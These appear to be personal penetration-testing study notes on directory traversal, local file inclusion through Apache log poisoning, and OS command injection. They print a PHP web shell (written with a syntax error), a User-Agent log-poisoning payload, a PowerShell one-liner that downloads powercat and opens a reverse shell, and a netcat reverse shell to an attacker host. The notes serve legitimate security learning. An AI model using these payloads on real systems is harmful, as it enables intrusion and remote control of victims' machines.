## Section 9.1 Directory Traversal
### Subsection 9.1.2 Identifying and Exploiting Directory Traversals
- Most websites are run in a subdirectory of a low privileged user called www-data
	- /var/www/html/
	- C:\inetpub\wwwroot
- SSH keys can usually be located in ~/.ssh/
- To SSH using a private key file do the following 
```
sudo chmod 400 KEY_FILE
```
```
ssh -i KEY_FILE user@IP
```
### Subsection 9.1.3 Encoding Special Characters
- %2e can be used to replace . when trying to do directory traversal
## Section 9.2 File Inclusion Vulnerabilities
### Subsection 9.2.1 Local File Inclusion (LFI)
- One way to achieve LFI is to include executable code in a local file like access.log at /var/log/apache2/ then browsing to the page which will execute our code
- - LFI can be used to get a reverse shell or to add our authorized key to the authorized keys file 
- to generate an authorized key 
- Quick php one-liner for LFI or as a stand-alone file for web app cmd access
```
<?php echo system($_GET['cmd']; ?>)
```
- Sent the following as the user-agent in the header
	- This was saved to ../../../../../../../../../var/log/apache2/access.log
	- Now when this file is called wiht &cmd=COMMAND the output comes back with the log file information and the cmd output based on where it has been stored in the logs 
	- Did have to use url encoding for spaces doing this
```
# Header
User-Agent: <?php echo system($_GET['cmd']; ?>)
# url call 
http://IP/../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
## Section 9.4.1 OS Command Injection
- To determine if cmd or powershell is being executed on a windows machine run the following command to see what interpreter is processing it
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- One-liner to run powercat from download
```
IEX(New-Object System.Net.WebClient).DownloadString("SERVER_ADDRESS/powercat.ps1");powercat -c LHOST -p LPORT -e powershell
```
- nc reverse shell from victim machine
```
# URL encode as needed
nc -e /bin/bash ATTACKER_IP ATTACKER_PORT
```

## Exercises To-Do

- [ ] 2.1.1 (page 20)